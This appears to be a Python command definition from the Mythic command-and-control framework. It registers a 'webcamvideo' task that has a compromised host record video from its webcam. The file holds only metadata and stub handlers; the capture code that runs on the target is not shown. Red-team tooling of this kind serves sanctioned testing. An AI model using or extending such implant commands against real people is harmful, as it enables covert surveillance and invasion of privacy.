from mythic_container.MythicCommandBase import *
from uuid import uuid4
import json
from os import path
from mythic_container.MythicRPC import *
import base64

class WebcamVideoArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class WebcamVideoCommand(CommandBase):
    cmd = "webcamvideo"
    needs_admin = False
    help_cmd = "webcamvideo"
    description = "Take a video from the webcam."
    version = 2
    author = "@reznok, @djhohnstein"
    argument_class = WebcamVideoArguments
    browser_script = BrowserScript(script_name="webcamvideo", author="@djhohnstein", for_new_ui=True)
    attackmapping = ["T1113"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
